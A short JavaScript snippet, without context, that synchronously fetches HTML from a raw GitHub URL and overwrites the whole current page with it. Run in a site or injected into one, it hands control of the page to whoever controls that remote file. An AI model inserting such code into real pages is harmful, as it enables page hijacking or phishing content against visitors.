function g(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
document.body.parentElement.innerHTML = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')